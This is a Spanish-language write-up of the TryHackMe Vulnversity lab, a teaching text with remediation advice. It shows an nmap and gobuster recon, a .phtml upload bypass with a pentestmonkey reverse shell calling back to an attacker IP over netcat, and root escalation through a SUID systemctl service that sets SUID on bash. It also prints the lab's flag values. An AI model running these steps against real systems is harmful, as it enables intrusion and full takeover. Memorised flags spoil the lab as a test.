# Vulnversity — TryHackMe · Write-up

> **Plataforma:** TryHackMe · **Sala:** [Vulnversity](https://tryhackme.com/room/vulnversity) · **Dificultad:** Fácil
> **Autora:** Cyntia Zebaze ([github.com/Zebdon](https://github.com/Zebdon)) · **Fecha:** octubre 2026
> **Técnicas:** Reconocimiento · Enumeración web · Subida de ficheros (upload bypass) · Reverse shell · Escalada de privilegios (SUID)

---

## 🎯 Resumen (TL;DR)

Máquina Linux comprometida de principio a fin: escaneo de puertos → descubrimiento de un directorio oculto con un formulario de subida → bypass del filtro de extensiones para subir un *reverse shell* `.phtml` → acceso como `www-data` → escalada a **root** abusando del bit SUID de `/bin/systemctl`.

| Fase | Herramienta | Resultado |
|------|-------------|-----------|
| Reconocimiento | `nmap` | 6 puertos abiertos; web en el **3333** |
| Enumeración | `gobuster` | directorio oculto `/internal/` con upload |
| Explotación | upload `.phtml` + `nc` | shell como `www-data` |
| Escalada | SUID `systemctl` (GTFOBins) | **root** |

---

## 1. Reconocimiento

Escaneo de servicios y versiones sobre la máquina objetivo:

```bash
nmap -sV <IP_VICTIMA>
```

**Puertos abiertos (6):**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21 | ftp | vsftpd 3.0.5 |
| 22 | ssh | OpenSSH 8.2p1 |
| 139 / 445 | netbios-ssn | Samba 4.6.2 |
| 3128 | http-proxy | Squid 4.10 |
| **3333** | **http** | **Apache httpd 2.4.41** |

> 🔑 **Observación clave:** el servidor web no está en el puerto 80, sino en el **3333**. Escanear todos los puertos (no solo los habituales) fue decisivo.

---

## 2. Enumeración web

Búsqueda de directorios ocultos en el servidor web:

```bash
gobuster dir -u http://<IP_VICTIMA>:3333 -w /usr/share/wordlists/dirb/common.txt
```

Entre los resultados destaca uno que no corresponde a una web normal:

```
/internal    (Status: 301)
```

Al visitar `http://<IP_VICTIMA>:3333/internal/` aparece un **formulario de subida de archivos**.

---

## 3. Explotación — subida de un reverse shell

### 3.1 Bypass del filtro de extensiones

La aplicación bloquea archivos `.php`, pero **no** filtra `.phtml`, que el servidor también interpreta como PHP. Se usa un reverse shell de pentestmonkey renombrado:

```bash
cp /usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php /root/shell.phtml
sed -i 's/10.2.2.1/<IP_ATACANTE>/' /root/shell.phtml   # IP de la máquina atacante
grep -n "ip =" /root/shell.phtml                        # validar el cambio
```

### 3.2 Escucha y disparo

En la máquina atacante se abre un *listener* y se sube el archivo por el formulario:

```bash
nc -lvnp 8888
```

Tras subir `shell.phtml`, se dispara visitando:

```
http://<IP_VICTIMA>:3333/internal/uploads/shell.phtml
```

Conexión recibida — acceso como `www-data`:

```
Connection received on <IP_VICTIMA>
$ whoami
www-data
```

> 🛡️ **Remediación:** validar el tipo real del archivo (no solo la extensión), renombrar los ficheros subidos, almacenarlos fuera de la raíz web y no permitir su ejecución.

---

## 4. Escalada de privilegios — SUID en `systemctl`

Búsqueda de binarios con bit SUID (se ejecutan con permisos de su dueño, root):

```bash
find / -perm -u=s -type f 2>/dev/null
```

Aparece un binario que **no debería** tener SUID:

```
/bin/systemctl
```

Siguiendo [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/), se crea un servicio malicioso que root ejecutará por nosotros:

```bash
cd /tmp
echo '[Service]
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > root.service

/bin/systemctl link /tmp/root.service
/bin/systemctl enable --now /tmp/root.service
```

El servicio pone el bit SUID a `/bin/bash`, lo que permite obtener una shell con privilegios de root:

```bash
/bin/bash -p
id
# uid=33(www-data) ... euid=0(root) egid=0(root)
```

> 🛡️ **Remediación:** eliminar el bit SUID de `systemctl` (`chmod u-s /bin/systemctl`), aplicar el principio de mínimo privilegio y auditar periódicamente los binarios SUID del sistema.

---

## 5. Flags

| Flag | Valor |
|------|-------|
| user.txt | `8bd7992fbe8a6ad22a63361004cfcedb` |
| root.txt | `a58ff8579f0a9270368d33a9966c7fd5` |

---

## 6. Lecciones aprendidas

- **Escanear todos los puertos**: el servicio crítico estaba en un puerto no estándar (3333).
- **Filtrar por extensión es una defensa débil**: `.phtml` burló el bloqueo de `.php`.
- **Los binarios SUID mal configurados** son una vía directa a root; `systemctl` nunca debería tenerlo.
- **Enfoque defensivo (dev):** validación de subidas del lado servidor, mínimo privilegio y auditoría de SUID habrían cerrado toda la cadena.

---

<!--
================================================================
CÓMO REUTILIZAR ESTA PLANTILLA (borra este bloque al publicar)
================================================================
1. Copia este archivo y renómbralo: writeup-<nombre-maquina>.md
2. Cambia la cabecera (sala, dificultad, fecha, enlace).
3. Sustituye <IP_VICTIMA> y <IP_ATACANTE> por las de esa máquina.
4. Rellena cada fase con TUS comandos y resultados reales.
5. Añade capturas si quieres: ![descripcion](ruta/captura.png)
6. Mantén SIEMPRE las secciones de "Remediación" y "Lecciones":
   demuestran mentalidad defensiva, que es lo que valoran en AppSec.
7. Súbelo a un repo de GitHub (p. ej. "thm-writeups") y enlázalo
   en tu LinkedIn.
================================================================
-->
